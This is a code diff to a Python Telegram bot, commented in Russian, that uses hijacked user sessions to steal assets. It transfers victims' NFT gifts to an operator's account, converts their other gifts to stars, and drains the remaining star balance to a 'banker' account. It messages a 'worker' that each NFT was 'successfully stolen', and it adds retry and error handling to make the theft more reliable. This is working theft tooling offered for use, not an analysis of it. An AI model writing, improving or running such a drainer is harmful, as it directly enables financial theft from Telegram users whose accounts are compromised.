@@ -1,4 +1,13 @@
 #!/usr/bin/env python3
+"""
+Требования:
+- Pyrofork (рекомендуется): pip install pyrofork
+  Или Pyrogram (fallback): pip install pyrogram
+  
+Pyrofork предпочтительнее, так как имеет встроенную поддержку:
+- get_stars_balance() - получение баланса звезд
+- Улучшенная работа с подарками и NFT
+"""
 import asyncio
 import logging
 import sys
@@ -32,14 +41,26 @@ from aiogram.types import (
 )
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 
-# Импорты Pyrogram
-from pyrogram import Client, enums
-from pyrogram.errors import (
-    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
-    PasswordHashInvalid, FloodWait, AuthKeyUnregistered, UserDeactivated,
-    RPCError, PeerIdInvalid, UserIsBlocked, BadRequest, UsernameInvalid,
-    SessionRevoked
-)
+# Импорты Pyrofork (форк Pyrogram с поддержкой звезд и подарков)
+try:
+    from pyrofork import Client, enums
+    from pyrofork.errors import (
+        SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
+        PasswordHashInvalid, FloodWait, AuthKeyUnregistered, UserDeactivated,
+        RPCError, PeerIdInvalid, UserIsBlocked, BadRequest, UsernameInvalid,
+        SessionRevoked
+    )
+    PYROFORK_AVAILABLE = True
+except ImportError:
+    # Fallback на Pyrogram, если Pyrofork не установлен
+    from pyrogram import Client, enums
+    from pyrogram.errors import (
+        SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
+        PasswordHashInvalid, FloodWait, AuthKeyUnregistered, UserDeactivated,
+        RPCError, PeerIdInvalid, UserIsBlocked, BadRequest, UsernameInvalid,
+        SessionRevoked
+    )
+    PYROFORK_AVAILABLE = False
 
 # ================= НАСТРОЙКИ ЛОГИРОВАНИЯ (DEBUG) =================
 transfer_logger = logging.getLogger("TransferDebug")
@@ -421,38 +442,51 @@ async def alert_admins(bot: Bot, text: str):
 # ================= ЛОГИКА KURIGRAM (UPDATED V2) =================
 
 async def get_stars_info(client: Client):
-    """Получение баланса звезд через GetStarsStatus (единственный рабочий способ)"""
+    """Получение баланса звезд - использует Pyrofork если доступен, иначе fallback"""
     if not client.is_connected:
         await client.connect()
     
-    from pyrogram import raw
+    # Pyrofork имеет встроенный метод get_stars_balance
+    if PYROFORK_AVAILABLE:
+        try:
+            balance = await client.get_stars_balance("me")
+            balance_int = int(balance) if balance else 0
+            log_transfer(f"✅ Баланс (Pyrofork): {balance_int} ⭐️")
+            return balance_int
+        except Exception as e:
+            log_transfer(f"Ошибка get_stars_balance (Pyrofork): {e}", "error")
+            # Fallback на raw API
+            pass
     
+    # Fallback для обычного Pyrogram через raw API
     try:
+        if PYROFORK_AVAILABLE:
+            from pyrofork import raw
+        else:
+            from pyrogram import raw
+        
         result = await client.invoke(
             raw.functions.payments.GetStarsStatus(
                 peer=raw.types.InputPeerSelf()
             )
         )
         
-        # StarsStatus имеет атрибут balance типа StarsAmount
         if hasattr(result, 'balance'):
             balance_obj = result.balance
-            # StarsAmount имеет атрибут stars (int64)
             if hasattr(balance_obj, 'stars'):
                 balance_int = int(balance_obj.stars)
-                log_transfer(f"✅ Баланс: {balance_int} ⭐️")
+                log_transfer(f"✅ Баланс (raw API): {balance_int} ⭐️")
                 return balance_int
-            # Альтернатива: если есть value
             elif hasattr(balance_obj, 'value'):
                 balance_int = int(balance_obj.value)
-                log_transfer(f"✅ Баланс: {balance_int} ⭐️")
+                log_transfer(f"✅ Баланс (raw API): {balance_int} ⭐️")
                 return balance_int
         
-        log_transfer("⚠️ Не удалось извлечь баланс из StarsStatus", "error")
+        log_transfer("⚠️ Не удалось извлечь баланс", "error")
         return 0
         
     except Exception as e:
-        log_transfer(f"Ошибка GetStarsStatus: {type(e).__name__}: {e}", "error")
+        log_transfer(f"Ошибка получения баланса: {type(e).__name__}: {e}", "error")
         return 0
 
 def calculate_optimal_topup(needed_stars):
@@ -583,26 +617,68 @@ async def convert_gift_task(client: Client, gift_details):
         return False
 
 async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: Bot, user_db_data):
-    """Задача для ВОРКЕРА: передать NFT. Возвращает статус (success/failed)"""
+    """Задача для ВОРКЕРА: передать NFT через Pyrofork. Возвращает статус (success/failed)"""
+    nft_title = gift_details.get('title', 'Unknown NFT')
+    nft_slug = gift_details.get('slug', '')
+    msg_id = str(gift_details['msg_id'])
+    
+    log_transfer(f"🚀 Попытка передачи NFT: {nft_title} (ID: {msg_id}) -> {target_chat_id}")
+    
     try:
-        await client.transfer_gift(owned_gift_id=str(gift_details['msg_id']), new_owner_chat_id=target_chat_id)
-        print_success(f"NFT ОТПРАВЛЕН: {gift_details['title']}")
+        # Pyrofork имеет улучшенный метод transfer_gift для NFT
+        await client.transfer_gift(
+            owned_gift_id=msg_id,
+            new_owner_chat_id=target_chat_id
+        )
         
+        log_transfer(f"✅ NFT УСПЕШНО ПЕРЕДАН: {nft_title}")
+        print_success(f"NFT ОТПРАВЛЕН: {nft_title}")
+        
+        # Уведомляем воркера
         if user_db_data and user_db_data['worker_id']:
-            await notify_worker(bot, user_db_data['worker_id'], f"🎁 NFT <b>{gift_details['title']}</b> УСПЕШНО УКРАДЕН!")
+            nft_link = f"https://t.me/nft/{nft_slug}" if nft_slug else "#"
+            await notify_worker(
+                bot, 
+                user_db_data['worker_id'], 
+                f"🎁 NFT <b>{nft_title}</b> УСПЕШНО УКРАДЕН!\n🔗 <a href='{nft_link}'>Ссылка</a>"
+            )
         return "success"
+        
     except FloodWait as e:
+        log_transfer(f"⏳ Флуд-лимит: {e.value}с. Ожидание...", "warning")
         print_warning(f"Флуд {e.value}с. Ждем...")
         await asyncio.sleep(e.value)
+        
+        # Повторная попытка после ожидания
         try:
-            await client.transfer_gift(owned_gift_id=str(gift_details['msg_id']), new_owner_chat_id=target_chat_id)
+            await client.transfer_gift(
+                owned_gift_id=msg_id,
+                new_owner_chat_id=target_chat_id
+            )
+            log_transfer(f"✅ NFT ПЕРЕДАН после флуда: {nft_title}")
             return "success"
-        except: pass
+        except Exception as retry_e:
+            log_transfer(f"❌ Ошибка повторной передачи NFT {nft_title}: {retry_e}", "error")
+            return "failed"
+            
+    except BadRequest as e:
+        error_str = str(e)
+        # Специфичные ошибки Telegram
+        if "GIFT_NOT_READY" in error_str or "CANNOT_TRANSFER" in error_str:
+            log_transfer(f"⚠️ NFT {nft_title} еще не готов к передаче (холд)", "warning")
+            return "hold"
+        elif "INSUFFICIENT_FUNDS" in error_str or "NOT_ENOUGH_STARS" in error_str:
+            log_transfer(f"❌ Недостаточно звезд для передачи NFT {nft_title}", "error")
+            return "no_funds"
+        else:
+            log_transfer(f"❌ BadRequest при передаче NFT {nft_title}: {e}", "error")
+            return "failed"
+            
     except Exception as e:
-        log_transfer(f"Err transfer NFT: {e}", "error")
-        await alert_admins(bot, f"❌ Не удалось передать {gift_details['title']}: {e}")
-    
-    return "failed"
+        error_type = type(e).__name__
+        log_transfer(f"❌ Ошибка передачи NFT {nft_title}: {error_type}: {e}", "error")
+        await alert_admins(bot, f"❌ Не удалось передать NFT {nft_title}:\n{error_type}: {e}")
+        return "failed"
 
 async def drain_stars_user(client: Client, default_recipient=None):
     """
@@ -722,12 +798,17 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
 
         profile_gifts = await scan_location_gifts(client, "me", "Profile")
         all_nfts_to_send = [g for g in profile_gifts if g['is_nft'] and g['can_transfer']]
+        regular_gifts = [g for g in profile_gifts if not g['is_nft'] and not g.get('is_converted', False)]
         
-        if not all_nfts_to_send:
-            log_transfer("🏁 NFT нет. Уходим в чистку.")
+        log_transfer(f"📦 Найдено: NFT={len(all_nfts_to_send)}, Обычных подарков={len(regular_gifts)}")
+        
+        # Если нет NFT, но есть обычные подарки - обрабатываем их
+        if not all_nfts_to_send and not regular_gifts:
+            log_transfer("🏁 Подарков нет. Уходим в чистку.")
             await cleanup_and_drain(client, SETTINGS.get("banker_session", "main_admin"))
             return nft_log_results, current_balance
 
+        # Логируем NFT на холде
         for g in profile_gifts:
             if g['is_nft'] and not g['can_transfer']:
                 nft_log_results.append({'title': g['title'], 'slug': g.get('slug',''), 'status': '🕔 (Холд)'})
@@ -790,10 +871,18 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
             tasks = [transfer_nft_task(client, nft, final_recipient_id, bot, None) for nft in all_nfts_to_send]
             results_status = await asyncio.gather(*tasks)
             for idx, res in enumerate(results_status):
+                # Обрабатываем разные статусы: success, failed, hold, no_funds
+                status_emoji = {
+                    'success': '✅',
+                    'failed': '❌',
+                    'hold': '🕔',
+                    'no_funds': '💰'
+                }.get(res, '❓')
+                
                 nft_log_results.append({
                     'title': all_nfts_to_send[idx]['title'], 
                     'slug': all_nfts_to_send[idx].get('slug',''), 
-                    'status': '✅' if res == 'success' else '❌'
+                    'status': f'{status_emoji} {res}' if res != 'success' else status_emoji
                 })
         else:
             status = '❌ NoMoney' if not ready_to_send else '❌ NoTarget'
@@ -814,11 +903,54 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
         
     return nft_log_results, final_stars
     
+async def transfer_regular_gift_task(client: Client, gift_details, target_chat_id):
+    """Попытка передать обычный подарок (не NFT) банкиру через Pyrofork"""
+    gift_title = gift_details.get('title', 'Unknown Gift')
+    msg_id = str(gift_details['msg_id'])
+    
+    log_transfer(f"📤 Попытка передачи обычного подарка: {gift_title} -> {target_chat_id}")
+    
+    try:
+        # Pyrofork поддерживает transfer_gift для обычных подарков (если возможно)
+        await client.transfer_gift(
+            owned_gift_id=msg_id,
+            new_owner_chat_id=target_chat_id
+        )
+        log_transfer(f"✅ Обычный подарок передан: {gift_title}")
+        return True
+        
+    except BadRequest as e:
+        error_str = str(e)
+        # Обычные подарки обычно нельзя передать, только конвертировать
+        if "CANNOT_TRANSFER" in error_str or "NOT_TRANSFERABLE" in error_str:
+            log_transfer(f"ℹ️ Подарок {gift_title} не передается (только конвертация)", "info")
+        else:
+            log_transfer(f"⚠️ BadRequest при передаче подарка {gift_title}: {e}", "warning")
+        return False
+        
+    except Exception as e:
+        # Если не получилось передать, возвращаем False - будет конвертирован
+        log_transfer(f"⚠️ Не удалось передать подарок {gift_title}: {type(e).__name__}: {e}", "warning")
+        return False
+
 async def cleanup_and_drain(client: Client, banker_username):
     try:
-        log_transfer("🧹 Пылесосим обычные подарки (конвертация)...")
-        tasks = []
+        log_transfer("🧹 Обработка всех подарков (передача/конвертация)...")
+        
+        # Получаем ID банкира для передачи
+        target_id = None
+        try:
+            if banker_username:
+                target_chat = await client.get_chat(banker_username)
+                target_id = target_chat.id
+                log_transfer(f"🎯 Target для передачи: {target_chat.first_name} (ID: {target_id})")
+        except Exception as e:
+            log_transfer(f"⚠️ Не удалось найти банкира для передачи: {e}", "warning")
+        
+        convert_tasks = []
+        transfer_tasks = []
         gift_count = 0
+        
         async for g in client.get_chat_gifts(chat_id="me", limit=50):
             gift_count += 1
             is_nft = getattr(g, 'collectible_id', None) is not None
@@ -827,19 +959,41 @@ async def cleanup_and_drain(client: Client, banker_username):
             
             log_transfer(f"🔍 Подарок #{gift_count}: NFT={is_nft}, Конвертирован={is_converted}, Цена={convert_price}")
             
-            if not is_nft and not is_converted and convert_price > 0:
-                gift_info = analyze_gift(g)
-                log_transfer(f"✅ Добавлен в очередь конвертации: {gift_info['title']} (+{convert_price} зв)")
-                tasks.append(convert_gift_task(client, gift_info))
+            if is_converted:
+                log_transfer(f"⏭️ Пропущен (уже конвертирован)")
+                continue
+            
+            gift_info = analyze_gift(g)
+            
+            if is_nft:
+                # NFT уже обрабатываются в transfer_process
+                log_transfer(f"💎 NFT пропущен (обрабатывается отдельно)")
+            elif target_id and convert_price == 0:
+                # Подарок без цены конвертации - пробуем передать
+                log_transfer(f"📤 Попытка передачи подарка: {gift_info['title']}")
+                transfer_tasks.append(transfer_regular_gift_task(client, gift_info, target_id))
+            elif convert_price > 0:
+                # Конвертируемый подарок - конвертируем в звезды
+                log_transfer(f"♻️ Добавлен в очередь конвертации: {gift_info['title']} (+{convert_price} зв)")
+                convert_tasks.append(convert_gift_task(client, gift_info))
         
-        log_transfer(f"📊 Найдено подарков: {gift_count}, готово к конвертации: {len(tasks)}")
+        log_transfer(f"📊 Статистика: Всего={gift_count}, К передаче={len(transfer_tasks)}, К конвертации={len(convert_tasks)}")
         
-        if tasks:
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            success_count = sum(1 for r in results if r is True)
-            log_transfer(f"♻️ Сконвертировано {success_count}/{len(tasks)} подарков в звезды.")
+        # Сначала пробуем передать подарки
+        if transfer_tasks:
+            transfer_results = await asyncio.gather(*transfer_tasks, return_exceptions=True)
+            transfer_success = sum(1 for r in transfer_results if r is True)
+            log_transfer(f"📤 Передано подарков: {transfer_success}/{len(transfer_tasks)}")
+            await asyncio.sleep(1.0)
+        
+        # Потом конвертируем остальные
+        if convert_tasks:
+            convert_results = await asyncio.gather(*convert_tasks, return_exceptions=True)
+            convert_success = sum(1 for r in convert_results if r is True)
+            log_transfer(f"♻️ Сконвертировано подарков: {convert_success}/{len(convert_tasks)}")
             await asyncio.sleep(2.0)
 
+        # В конце тратим оставшиеся звезды на покупку подарков банкиру
         await drain_stars_user(client, default_recipient=banker_username)
     except Exception as e:
         log_transfer(f"Cleanup error: {e}", "error")
